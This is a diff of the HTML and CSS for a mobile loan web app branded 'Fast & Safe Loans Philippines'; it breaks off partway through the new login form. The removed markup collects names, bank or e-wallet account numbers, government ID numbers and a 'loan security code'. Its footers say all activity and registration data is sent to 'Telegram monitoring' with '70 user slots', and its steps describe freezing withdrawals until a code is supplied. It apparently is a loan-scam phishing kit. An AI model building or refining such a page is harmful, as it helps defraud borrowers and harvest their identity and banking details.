@@ -1,1425 +1,1329 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Fast & Safe Loans Philippines</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-<style>
-:root{
-  --yellow:#F5B800;
-  --yellow-dark:#d4a309;
-  --yellow-light:#fff8e1;
-  --yellow-soft:#fff3c4;
-  --bg:#faf7f0;
-  --card:#ffffff;
-  --text:#1a1a1a;
-  --muted:#6b7280;
-  --border:#ece3c8;
-  --blue-input:#f0f6ff;
-  --green:#16a34a;
-  --red:#dc2626;
-  --shadow:0 8px 30px rgba(245,184,0,.12);
-}
-*{box-sizing:border-box;margin:0;padding:0}
-html{font-size:15px}
-body{
-  font-family:'Inter',system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
-  background: var(--bg);
-  color:var(--text);
-  -webkit-font-smoothing:antialiased;
-  min-height:100vh;
-}
-.app{
-  max-width:440px;
-  margin:0 auto;
-  min-height:100vh;
-  background:#fff;
-  position:relative;
-  box-shadow:0 0 40px rgba(0,0,0,.06);
-  overflow-x:hidden;
-}
-.hidden{display:none!important}
-.screen{padding:22px 20px 90px;min-height:100vh;}
-/* Auth */
-.auth-top{
-  text-align:center;
-  padding:28px 0 18px;
-}
-.logo-circle{
-  width:72px;height:72px;border-radius:22px;
-  background:linear-gradient(145deg,#ffe082,#F5B800);
-  display:flex;align-items:center;justify-content:center;
-  margin:0 auto 14px;
-  box-shadow:var(--shadow);
-  font-size:32px;
-}
-.brand-title{font-size:22px;font-weight:800;letter-spacing:-.3px}
-.brand-sub{color:var(--muted);font-size:13px;margin-top:4px}
-.auth-card{
-  background:#fff;
-  border-radius:20px;
-  padding:22px 18px;
-  border:1px solid var(--border);
-  box-shadow:0 4px 22px rgba(0,0,0,.045);
-}
-.auth-card h2{font-size:18px;font-weight:700;margin-bottom:4px}
-.auth-card p.muted{font-size:12.5px;color:var(--muted);margin-bottom:16px}
-.input-group{margin-bottom:13px;position:relative}
-.input-group label{font-size:12px;font-weight:600;color:#3d3d3d;display:block;margin-bottom:6px}
-.input-wrap{
-  display:flex;align-items:center;
-  background:var(--blue-input);
-  border:1.5px solid #dbe9ff;
-  border-radius:14px;
-  padding:0 13px;
-  transition:.18s;
-}
-.input-wrap:focus-within{border-color:var(--yellow);background:#fffdf5;box-shadow:0 0 0 3px #fff2bf}
-.input-wrap .ico{font-size:16px;margin-right:9px;opacity:.75;min-width:20px;text-align:center}
-.input-wrap input,.input-wrap select{
-  flex:1;border:none;background:transparent;
-  padding:14px 2px;
-  font-size:14.5px;
-  outline:none;
-  font-family:inherit;
-  color:var(--text);
-  width:100%;
-}
-.input-wrap input::placeholder{color:#9aa5b8}
-.btn{
-  width:100%;
-  padding:15px;
-  border-radius:14px;
-  border:none;
-  font-weight:700;
-  font-size:15px;
-  cursor:pointer;
-  transition:.18s;
-  font-family:inherit;
-}
-.btn-primary{
-  background:var(--yellow);
-  color:#1a1a1a;
-  box-shadow:0 6px 18px rgba(245,184,0,.32);
-}
-.btn-primary:hover{transform:translateY(-1px);background:#ffca1a}
-.btn-primary:active{transform:translateY(0)}
-.btn-ghost{background:#f6f6f6;color:#444}
-.btn-outline{background:#fff;border:1.5px solid var(--border);color:#333}
-.btn-danger{background:#fff1f1;color:var(--red);border:1.5px solid #ffd3d3}
-.muted-center{ text-align:center;font-size:12.8px;color:var(--muted);margin-top:14px}
-.link-yellow{color:var(--yellow-dark);font-weight:700;cursor:pointer;text-decoration:none}
-.link-yellow:hover{text-decoration:underline}
-.security-code-box{
-  background:linear-gradient(135deg,#fff8d6,#fff2ad);
-  border:2px dashed #e6b800;
-  border-radius:16px;
-  padding:16px;
-  margin-top:6px;
-  animation:slideDown .3s ease;
-}
-@keyframes slideDown{from{opacity:0;transform:translateY(-8px)}to{opacity:1;transform:translateY(0)}}
-.security-code-box .sc-title{font-weight:750;font-size:14px;display:flex;align-items:center;gap:7px}
-.security-code-box p{font-size:12px;color:#7a5b00;margin:5px 0 10px}
-.input-wrap.security{
-  background:#fffbe6;
-  border-color:#f5d24a;
-}
-.alert{padding:12px 14px;border-radius:12px;font-size:13px;margin-bottom:12px;font-weight:500}
-.alert-info{background:#eff6ff;color:#1e4a8a;border:1px solid #cfe2ff}
-.alert-warn{background:#fff8e1;color:#8a6100;border:1px solid #ffe08a}
-.alert-error{background:#fff1f1;color:#b91c1c;border:1px solid #ffc9c9}
-.alert-success{background:#f0fdf4;color:#166534;border:1px solid #bbf7d0}
-/* Dashboard */
-.dash-header{
-  background:linear-gradient(160deg,#ffcf2a 0%, #F5B800 55%, #e7a900 100%);
-  color:#1b1400;
-  padding:18px 18px 34px;
-  border-radius:0 0 26px 26px;
-  position:relative;
-}
-.dash-top-row{display:flex;justify-content:space-between;align-items:center}
-.dash-welcome{font-size:12.5px;opacity:.8;font-weight:500}
-.dash-name{font-size:18px;font-weight:800}
-.dash-icons{display:flex;gap:10px}
-.icon-btn{
-  width:38px;height:38px;border-radius:12px;
-  background:rgba(255,255,255,.28);
-  border:1px solid rgba(255,255,255,.35);
-  display:flex;align-items:center;justify-content:center;
-  cursor:pointer;font-size:16px;
-  backdrop-filter: blur(6px);
-}
-.balance-card{
-  background:#fff;
-  border-radius:20px;
-  padding:18px;
-  margin:-22px 18px 16px;
-  box-shadow:0 10px 34px rgba(0,0,0,.08);
-  border:1px solid #f3e5b5;
-  position:relative;
-  z-index:3;
-}
-.balance-label{font-size:12px;color:var(--muted);font-weight:600}
-.balance-amount{font-size:30px;font-weight:800;letter-spacing:-.8px;margin:4px 0}
-.balance-row{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
-.badge{
-  padding:5px 11px;border-radius:999px;font-size:11.5px;font-weight:700;
-}
-.badge-none{background:#f3f4f6;color:#555}
-.badge-pending{background:#fff3c2;color:#9a6b00}
-.badge-approved{background:#dcfce7;color:#166534}
-.badge-rejected{background:#fee2e2;color:#991b1b}
-.badge-frozen{background:#ffe4e6;color:#be123c}
-.freeze-btn{
-  padding:7px 13px;border-radius:999px;font-size:12px;font-weight:700;cursor:pointer;border:1.5px solid #ffe08a;background:#fffaf0;color:#a16a00;
-}
-.freeze-btn.danger{border-color:#ffc9c9;background:#fff5f5;color:#c21c1c}
-.quick-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px;padding:0 18px;margin-bottom:16px}
-.quick-card{
-  background:#fff;
-  border:1px solid var(--border);
-  border-radius:16px;
-  padding:14px 10px;
-  text-align:center;
-  cursor:pointer;
-  transition:.15s;
-}
-.quick-card:hover{transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,0,0,.06)}
-.quick-card .qico{font-size:22px;margin-bottom:6px}
-.quick-card span{font-size:12px;font-weight:600;display:block}
-.main-content{padding:0 18px 100px}
-.panel{display:none}
-.panel.active{display:block;animation:fadeIn .22s ease}
-@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
-.section-title{font-size:16px;font-weight:800;margin:8px 0 12px}
-.card{
-  background:#fff;border:1px solid var(--border);border-radius:18px;padding:16px;margin-bottom:14px;
-  box-shadow:0 2px 10px rgba(0,0,0,.03)
-}
-.card-title{font-weight:700;font-size:14px;margin-bottom:10px}
-.two-col{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-.info-row{display:flex;justify-content:space-between;padding:9px 0;border-bottom:1px dashed #f0e6c4;font-size:13.5px}
-.info-row:last-child{border-bottom:none}
-.info-row b{font-weight:700}
-.info-row span:first-child{color:var(--muted)}
-/* Loan form */
-.form-grid{display:grid;gap:12px}
-.form-grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
-@media(max-width:420px){.form-grid-2{grid-template-columns:1fr}}
-.small-note{font-size:11.5px;color:var(--muted);margin-top:5px}
-/* Bank select */
-.bank-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:12px}
-.bank-item{
-  border:1.7px solid var(--border);
-  border-radius:13px;
-  padding:11px;
-  text-align:center;
-  cursor:pointer;
-  font-size:12.5px;
-  font-weight:600;
-  background:#fff;
-  transition:.14s;
-}
-.bank-item.selected{border-color:var(--yellow);background:#fffbe8;box-shadow:0 0 0 3px #fff2bf}
-.bank-item small{display:block;color:var(--muted);font-weight:500;margin-top:2px}
-/* Withdraw processing */
-.process-box{text-align:center;padding:16px}
-.spinner{
-  width:46px;height:46px;border:4px solid #fff0b8;border-top-color:var(--yellow);
-  border-radius:50%;margin:8px auto;animation:spin 1s linear infinite;
-}
-@keyframes spin{to{transform:rotate(360deg)}}
-.countdown{font-size:22px;font-weight:800;color:var(--yellow-dark);margin:6px 0}
-/* Modal */
-.modal-overlay{
-  position:fixed;inset:0;background:rgba(18,13,0,.52);backdrop-filter:blur(4px);
-  display:flex;align-items:center;justify-content:center;z-index:80;padding:18px;
-}
-.modal{
-  background:#fff;border-radius:22px;max-width:400px;width:100%;padding:22px;
-  box-shadow:0 20px 60px rgba(0,0,0,.22);
-  animation:pop .22s ease;
-  max-height:90vh;overflow-y:auto;
-}
-@keyframes pop{from{opacity:0;transform:scale(.96)}to{opacity:1;transform:scale(1)}}
-.modal h3{font-size:17px;font-weight:800;margin-bottom:6px}
-.modal p{font-size:13px;color:var(--muted);margin-bottom:12px}
-.modal .close-x{float:right;font-size:20px;cursor:pointer;color:#999}
-.code-input-big{text-align:center;font-size:20px;letter-spacing:4px;font-weight:700}
-/* Tabbar */
-.tabbar{
-  position:fixed;bottom:0;left:50%;transform:translateX(-50%);
-  width:100%;max-width:440px;
-  background:#fff;
-  border-top:1px solid #f0e5c0;
-  display:flex;justify-content:space-around;
-  padding:9px 6px calc(9px + env(safe-area-inset-bottom));
-  z-index:50;
-  box-shadow:0 -6px 24px rgba(0,0,0,.05)
-}
-.tab-btn{
-  flex:1;text-align:center;padding:6px 4px;border-radius:12px;cursor:pointer;color:#8b7a43;font-size:11.5px;font-weight:600;transition:.15s;border:none;background:transparent;font-family:inherit;
-}
-.tab-btn .ti{font-size:19px;display:block;margin-bottom:2px}
-.tab-btn.active{color:#573c00;background:#fff8da}
-.hr{height:1px;background:#f3e7bf;margin:12px 0}
-.tagline{font-size:11.5px;color:var(--muted);text-align:center;margin-top:10px}
-.kv{font-size:12.6px;color:#555;line-height:1.55}
-.steps{font-size:12.5px;color:#444;line-height:1.7;padding-left:18px}
-.steps li{margin-bottom:4px}
-.footer-note{font-size:11px;color:#9a8a5a;text-align:center;padding:14px 18px}
-.toast-wrap{
-  position:fixed;top:16px;left:50%;transform:translateX(-50%);z-index:200;
-  width:calc(100% - 32px);max-width:410px;
-}
-.toast{
-  background:#1d1d1d;color:#fff;padding:12px 15px;border-radius:13px;font-size:13.5px;
-  box-shadow:0 8px 26px rgba(0,0,0,.28);
-  margin-bottom:8px;animation:toastIn .25s ease;
-}
-.toast.success{background:#14532d}
-.toast.error{background:#991b1b}
-.toast.warn{background:#92400e}
-@keyframes toastIn{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}
-.id-photo-box{
-  background:#fbfbfb;border:1.5px dashed #e7d99f;border-radius:14px;padding:16px;text-align:center;
-}
-.id-photo-box img{max-width:100%;border-radius:10px}
-.pill-row{display:flex;gap:8px;flex-wrap:wrap;margin-top:8px}
-.pill{background:#fff7d6;border:1px solid #f2dc7a;padding:5px 10px;border-radius:999px;font-size:11.5px;font-weight:600}
-.list-compact{font-size:13px;line-height:1.8;color:#3b3b3b}
-.list-compact b{color:#111}
-::-webkit-scrollbar{width:6px}
-::-webkit-scrollbar-thumb{background:#ead68a;border-radius:4px}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Fast & Safe Loans Philippines</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-yellow: #F5B800;
+            --dark-yellow: #d4a309;
+            --light-yellow: #fff8e1;
+            --background: #f0f2f5;
+            --card-bg: #ffffff;
+            --text-primary: #1a1a1a;
+            --text-secondary: #666666;
+            --border: #e8e8e8;
+            --success: #28a745;
+            --danger: #dc3545;
+            --info: #007bff;
+            --input-bg: #f0f2f5;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--background);
+            color: var(--text-primary);
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        #app {
+            width: 100%;
+            height: 100%;
+            max-width: 480px;
+            margin: 0 auto;
+            background-color: var(--card-bg);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+
+        .screen {
+            flex-grow: 1;
+            overflow-y: auto;
+            padding-bottom: 80px; /* Space for tab bar */
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* --- Login & Register Screens --- */
+        .auth-screen {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            height: 100%;
+        }
+
+        .auth-screen h1 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+        
+        .auth-screen .logo {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .auth-screen p {
+            color: var(--text-secondary);
+            margin-bottom: 2rem;
+        }
+
+        .form-group {
+            width: 100%;
+            margin-bottom: 1rem;
+            position: relative;
+        }
+
+        .form-group .icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--text-secondary);
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 14px 14px 45px;
+            border-radius: 10px;
+            border: 1px solid var(--border);
+            background-color: var(--input-bg);
+            font-size: 1rem;
+            transition: border-color 0.2s;
+        }
+
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary-yellow);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 15px;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: 10px;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-primary {
+            background-color: var(--primary-yellow);
+            color: var(--text-primary);
+        }
+
+        .btn-primary:hover {
+            background-color: var(--dark-yellow);
+        }
+        
+        .text-center { text-align: center; }
+        .mt-3 { margin-top: 1.5rem; }
+        .link {
+            color: var(--primary-yellow);
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        #security-code-group {
+            background-color: var(--light-yellow);
+            border: 1px solid var(--primary-yellow);
+            padding: 1rem;
+            border-radius: 10px;
+            margin-top: 1.5rem;
+        }
+        #security-code-group p {
+            font-size: 0.8rem;
+            color: var(--dark-yellow);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+
+        /* --- Main Dashboard --- */
+        #main-screen {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .main-header {
+            padding: 1rem 1.5rem;
+            background-color: var(--card-bg);
+            border-bottom: 1px solid var(--border);
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        
+        .main-header h2 {
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+
+        #content-panels {
+            padding: 1.5rem;
+            flex-grow: 1;
+        }
+        
+        /* Balance Card */
+        .balance-card {
+            background: linear-gradient(135deg, var(--primary-yellow), var(--dark-yellow));
+            color: white;
+            padding: 1.5rem;
+            border-radius: 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .balance-card .label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .balance-card .balance {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin: 0.5rem 0;
+            letter-spacing: -1px;
+        }
+        
+        .loan-status-badge {
+            display: inline-block;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        .status-no-loan { background-color: rgba(255,255,255,0.2); color: white; }
+        .status-pending { background-color: #ffc107; color: #333; }
+        .status-approved { background-color: var(--success); color: white; }
+        .status-rejected { background-color: var(--danger); color: white; }
+        .status-frozen { background-color: var(--danger); color: white; }
+
+
+        /* Quick Actions */
+        .quick-actions {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin-top: 2rem;
+        }
+
+        .action-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: var(--card-bg);
+            padding: 1rem 0.5rem;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+            cursor: pointer;
+            transition: all 0.2s;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .action-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+        }
+
+        .action-btn .icon {
+            font-size: 1.8rem;
+            margin-bottom: 8px;
+        }
+
+        /* Account Info */
+        .info-grid {
+            margin-top: 2rem;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+        }
+        .info-box {
+            background-color: var(--card-bg);
+            padding: 1rem;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+        .info-box .label {
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            margin-bottom: 5px;
+        }
+        .info-box .value {
+            font-size: 1rem;
+            font-weight: 600;
+        }
+
+        /* --- Tab Bar --- */
+        #tab-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            max-width: 480px;
+            margin: 0 auto;
+            height: 70px;
+            background-color: var(--card-bg);
+            border-top: 1px solid var(--border);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            padding-bottom: env(safe-area-inset-bottom);
+        }
+
+        .tab-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: var(--text-secondary);
+            cursor: pointer;
+            font-size: 0.7rem;
+            transition: color 0.2s;
+        }
+        .tab-item .icon { font-size: 1.5rem; margin-bottom: 2px; }
+        .tab-item.active { color: var(--primary-yellow); }
+
+        /* --- Loan & Withdraw Panel --- */
+        .panel { padding-bottom: 1.5rem; }
+        .panel h3 { font-size: 1.5rem; margin-bottom: 1.5rem; }
+        .panel textarea.form-control { padding: 14px; height: 100px; }
+        
+        #bank-selection {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 0.75rem;
+            margin-bottom: 1.5rem;
+        }
+        .bank-item {
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-size: 80%;
+            background-repeat: no-repeat;
+            background-position: center;
+            height: 50px;
+        }
+        .bank-item.selected {
+            border-color: var(--primary-yellow);
+            box-shadow: 0 0 0 2px var(--primary-yellow);
+        }
+
+        /* --- Profile Panel --- */
+        .profile-info {
+            list-style: none;
+        }
+        .profile-info li {
+            display: flex;
+            justify-content: space-between;
+            padding: 1rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .profile-info li:last-child { border-bottom: none; }
+        .profile-info .label { color: var(--text-secondary); }
+        .profile-info .value { font-weight: 600; }
+        
+        .btn-danger {
+            background-color: var(--danger);
+            color: white;
+        }
+        .btn-danger:hover {
+            background-color: #c82333;
+        }
+        
+        /* Overlays & Modals */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.7);
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal {
+            background-color: var(--card-bg);
+            padding: 2rem;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+        }
+        .modal h3 { margin-bottom: 1rem; }
+        .modal p { color: var(--text-secondary); margin-bottom: 1.5rem; }
+        
+        #id-photo-modal img {
+            max-width: 100%;
+            border-radius: 10px;
+        }
+        
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary-yellow);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Approval Code Input */
+        #loan-approval-code-group {
+            margin-top: 1.5rem;
+            padding: 1rem;
+            border-radius: 10px;
+            border: 1px solid var(--primary-yellow);
+            background-color: var(--light-yellow);
+        }
+        #loan-approval-code-group p {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: var(--dark-yellow);
+            margin-bottom: 10px;
+            text-align: center;
+        }
+    </style>
 </head>
 <body>
-<div class="app">
 
-  <!-- TOAST -->
-  <div class="toast-wrap" id="toastWrap"></div>
-
-  <!-- LOGIN SCREEN -->
-  <div id="loginScreen" class="screen">
-    <div class="auth-top">
-      <div class="logo-circle">₱</div>
-      <div class="brand-title">Fast & Safe Loans</div>
-      <div class="brand-sub">Philippines • SEC Registered • 24/7</div>
-    </div>
-
-    <div class="auth-card">
-      <h2>Welcome back</h2>
-      <p class="muted">Sign in to manage your loan account</p>
-
-      <div class="input-group">
-        <label>Email Address</label>
-        <div class="input-wrap">
-          <span class="ico">✉️</span>
-          <input id="loginEmail" type="email" placeholder="you@email.com" autocomplete="email">
-        </div>
-      </div>
-
-      <div class="input-group">
-        <label>Password</label>
-        <div class="input-wrap">
-          <span class="ico">🔒</span>
-          <input id="loginPassword" type="password" placeholder="••••••••" autocomplete="current-password">
-        </div>
-      </div>
-
-      <button class="btn btn-primary" id="loginBtn">Sign In</button>
-
-      <div class="muted-center">
-        New user? <span class="link-yellow" onclick="showRegister()">Create Account</span>
-      </div>
-
-      <div class="hr"></div>
-      <div class="kv">
-        <b>Demo Login:</b><br>
-        <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="52636061343a34343a3412353f333b3e7c313d3f">[email&#160;protected]</a> / 12345678<br>
-        <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3c5b534b594a555a0d090b7c535f494f594e125f5351">[email&#160;protected]</a> / ccdsdssdss
-      </div>
-      <div class="tagline">Telegram monitoring active • 70 user slots</div>
-    </div>
-
-    <div class="footer-note">
-      Fast & Safe Loans Philippines – v3 Advanced • All activity sent via Telegram API
-    </div>
-  </div>
-
-  <!-- REGISTER SCREEN -->
-  <div id="registerScreen" class="screen hidden">
-    <div class="auth-top">
-      <div class="logo-circle">📝</div>
-      <div class="brand-title">Create Account</div>
-      <div class="brand-sub">Fast & Safe Loans Philippines</div>
-    </div>
-
-    <div class="auth-card">
-      <h2>Open your loan account</h2>
-      <p class="muted">Complete all fields to register • SEC Licensed</p>
-
-      <div id="regStep1">
-        <div class="input-group">
-          <label>Full Name</label>
-          <div class="input-wrap"><span class="ico">👤</span><input id="regName" placeholder="Juan Dela Cruz"></div>
-        </div>
-        <div class="input-group">
-          <label>Email</label>
-          <div class="input-wrap"><span class="ico">✉️</span><input id="regEmail" type="email" placeholder="you@email.com"></div>
-        </div>
-        <div class="input-group">
-          <label>Password</label>
-          <div class="input-wrap"><span class="ico">🔒</span><input id="regPassword" type="password" placeholder="Min. 6 characters"></div>
-        </div>
-        <div class="input-group">
-          <label>Phone Number</label>
-          <div class="input-wrap"><span class="ico">📱</span><input id="regPhone" placeholder="+63 9XX XXX XXXX"></div>
-        </div>
-        <div class="input-group">
-          <label>Account Number</label>
-          <div class="input-wrap"><span class="ico">💳</span><input id="regAccountNumber" placeholder="Bank / e-wallet account"></div>
-        </div>
-        <div class="two-col">
-          <div class="input-group">
-            <label>ID Type</label>
-            <div class="input-wrap"><span class="ico">🪪</span>
-              <select id="regIdType" style="padding:14px 2px">
-                <option>UMID</option><option>PhilSys / National ID</option><option>Passport</option><option>Driver's License</option><option>SSS</option>
-              </select>
-            </div>
-          </div>
-          <div class="input-group">
-            <label>ID Number</label>
-            <div class="input-wrap"><span class="ico">#</span><input id="regIdNumber" placeholder="ID No."></div>
-          </div>
-        </div>
-
-        <button class="btn btn-primary" id="regStep1Btn">Create Account →</button>
-
-        <div class="muted-center">
-          Already have account? <span class="link-yellow" onclick="showLogin()">Sign In</span>
-        </div>
-      </div>
-
-      <!-- Step 2: Loan Security Code -->
-      <div id="regStep2" class="hidden">
-        <div class="security-code-box">
-          <div class="sc-title">🛡️ Loan Security Code Required</div>
-          <p>This code is required for loan processing security.<br>Fill loans bank code to proceed.</p>
-          <div class="input-group" style="margin-bottom:8px">
-            <label>Loan Security Code</label>
-            <div class="input-wrap security">
-              <span class="ico">🛡️</span>
-              <input id="regSecurityCode" placeholder="Enter loan bank security code" class="code-input-big" style="text-align:left;letter-spacing:1px;font-size:15px">
-            </div>
-          </div>
-          <div class="small-note">Code will be verified via Telegram API. Without code, loan will NOT be approved.</div>
-        </div>
-
-        <div style="margin-top:14px;display:grid;gap:9px">
-          <button class="btn btn-primary" id="regSubmitBtn">Submit / Open Account</button>
-          <button class="btn btn-ghost" onclick="backToReg1()">← Back</button>
-        </div>
-      </div>
-
-      <div class="tagline" style="margin-top:14px">All registration data is sent securely to Telegram monitoring.</div>
-    </div>
-  </div>
-
-  <!-- DASHBOARD -->
-  <div id="dashboard" class="hidden">
-    <!-- Header -->
-    <div class="dash-header">
-      <div class="dash-top-row">
-        <div>
-          <div class="dash-welcome">Fast & Safe Loans PH</div>
-          <div class="dash-name" id=" dashUserName">Welcome</div>
-        </div>
-        <div class="dash-icons">
-          <div class="icon-btn" onclick="openIdModal()" title="View ID">🪪</div>
-          <div class="icon-btn" onclick="logout()" title="Logout">↪</div>
-        </div>
-      </div>
-    </div>
-
-    <!-- Balance -->
-    <div class="balance-card">
-      <div class="balance-label">Available Balance</div>
-      <div class="balance-amount" id="balanceAmount">₱0.00</div>
-      <div class="balance-row">
-        <span id="loanStatusBadge" class="badge badge-none">No Loan</span>
-        <div id="freezeArea" style="display:none">
-          <button class="freeze-btn" id="freezeToggleBtn" onclick="handleFreezeClick()">🔒 Freeze</button>
-        </div>
-      </div>
-      <div class="small-note" id="frozenNote" style="display:none;color:#c21c1c;font-weight:600;margin-top:7px">⚠️ Account Frozen – Unfreeze required to withdraw</div>
-    </div>
-
-    <!-- Quick actions -->
-    <div class="quick-grid">
-      <div class="quick-card" onclick="switchTab('loan')">
-        <div class="qico">💸</div><span>Apply Loan</span>
-      </div>
-      <div class="quick-card" onclick="switchTab('withdraw')">
-        <div class="qico">🏦</div><span>Withdraw</span>
-      </div>
-      <div class="quick-card" onclick="openIdModal()">
-        <div class="qico">🪪</div><span>View ID</span>
-      </div>
-    </div>
-
-    <div class="main-content">
-
-      <!-- HOME PANEL -->
-      <div class="panel active" id="panel-home">
-        <div class="section-title">Account Overview</div>
-        <div class="card">
-          <div class="info-row"><span>Slot No.</span><b id="infoSlot">-</b></div>
-          <div class="info-row"><span>Account Type</span><b>Premium Borrower</b></div>
-          <div class="info-row"><span>Loan Amount</span><b id="infoLoanAmount">₱0</b></div>
-          <div class="info-row"><span>Withdrawal Attempts</span><b id="infoWithdrawAttempts">0</b></div>
-          <div class="info-row"><span>Account Status</span><b id="infoAccStatus">Active</b></div>
-        </div>
-
-        <div class="card">
-          <div class="card-title">How Fast & Safe Loans Works</div>
-          <ol class="steps">
-            <li>Apply loan – fill full details + bank code</li>
-            <li>Loan approval code required (sent via Telegram)</li>
-            <li>Funds auto-credit to your balance</li>
-            <li>Withdraw – 10s processing, bank security check</li>
-            <li>After 2 withdrawal attempts → account freeze protection</li>
-            <li>Unfreeze with security code → continue withdrawal</li>
-          </ol>
-        </div>
-
-        <div class="card">
-          <div class="card-title">Accepted Banks & Wallets</div>
-          <div class="pill-row">
-            <span class="pill">BDO</span><span class="pill">BPI</span><span class="pill">Metrobank</span><span class="pill">Landbank</span>
-            <span class="pill">PNB</span><span class="pill">Security Bank</span><span class="pill">UnionBank</span><span class="pill">RCBC</span>
-            <span class="pill">GCash</span><span class="pill">Maya</span><span class="pill">Coins.ph</span><span class="pill">GrabPay</span>
-          </div>
-        </div>
-      </div>
-
-      <!-- LOAN PANEL -->
-      <div class="panel" id="panel-loan">
-        <div class="section-title">Loan Application</div>
-        <div class="card">
-          <div class="form-grid">
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>Full Legal Name</label>
-                <div class="input-wrap"><span class="ico">👤</span><input id="loanName" placeholder="As per ID"></div>
-              </div>
-              <div class="input-group" style="margin:0">
-                <label>Date of Birth</label>
-                <div class="input-wrap"><span class="ico">🎂</span><input id="loanDob" type="date"></div>
-              </div>
-            </div>
-
-            <div class="two-col">
-              <div class="input-group" style="margin:0">
-                <label>ID Type</label>
-                <div class="input-wrap"><span class="ico">🪪</span>
-                  <select id="loanIdType" style="padding:14px 2px;width:100%;border:none;background:transparent;font-family:inherit;font-size:14px;outline:none">
-                    <option>UMID</option><option>PhilSys</option><option>Passport</option><option>Driver's License</option><option>SSS</option><option>Postal ID</option>
-                  </select>
+    <div id="app">
+        <!-- ===== Login Screen ===== -->
+        <div id="login-screen" class="screen auth-screen">
+            <div class="logo">🏦</div>
+            <h1>Welcome Back!</h1>
+            <p>Sign in to your account to continue</p>
+            <form id="login-form" style="width: 100%;">
+                <div class="form-group">
+                    <span class="icon">📧</span>
+                    <input type="email" id="login-email" class="form-control" placeholder="Email Address" required>
